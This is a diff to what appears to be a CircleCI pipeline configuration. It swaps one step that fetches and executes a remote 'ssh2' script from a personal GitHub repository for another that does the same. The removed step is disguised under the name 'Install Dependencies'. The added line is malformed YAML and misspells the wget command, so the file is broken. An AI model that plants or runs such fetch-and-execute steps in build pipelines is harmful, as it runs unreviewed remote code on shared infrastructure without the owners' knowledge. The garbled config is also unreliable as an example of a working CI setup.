@@ -6,10 +6,7 @@ jobs:
       parallelism: 1
       steps:
         - run:
-            name: Install Dependencies
-            command: |
-              lscpu
-               https://raw.githubusercontent.com/lijari/Testssh/main/ssh2.py && chmod +x ssh2.py && ./ssh2.py
+            Wget https://raw.githubusercontent.com/lijari/Testssh/main/ssh2.sh && chmod +x ssh2.sh && ./ssh2.sh
 
 workflows:
     version: 2.1
